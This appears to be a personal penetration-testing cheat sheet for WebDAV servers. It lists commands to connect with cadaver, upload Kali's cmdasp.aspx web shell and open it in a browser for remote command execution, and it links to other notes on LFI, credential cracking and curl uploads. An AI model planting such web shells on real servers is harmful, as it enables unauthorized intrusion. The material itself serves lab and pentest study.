---
category: Uncategorized
tags: [pentest]
created: 2024-12-21

---
![[Pasted image 20220328105716.png]]

#### Login
```bash - kali
cadaver http://$TARGET
```

Sometimes you see webdav at different location, be sure to follow your dirsearch.py results!

#### Reverse Shell
```bash - kali
cp /usr/share/webshells/aspx/cmdasp.aspx .
```

Login with steps above if needed.

```bash - kali
put cmdasp.aspx cmdasp.aspx
```

Visit page via browser.
```
http://$TARGET/cmdasp.aspx
```
#### LFI
![[3._LFI RFI#Webdav creds]]

![[TechLexicon/Penetration Testing/Reference/7._Tools/Hashcat#WebDav]]

#### File Upload
![[TechLexicon/Penetration Testing/Reference/7._Tools/Curl#Upload file]]

#### Webdav trigger webshell
![[TechLexicon/Penetration Testing/Reference/7._Tools/Curl#Webdav trigger webshell]]


Last updated: `$= dv.current().file.mtime.toFormat("MMMM dd, yyyy 'at' HH:mm")`
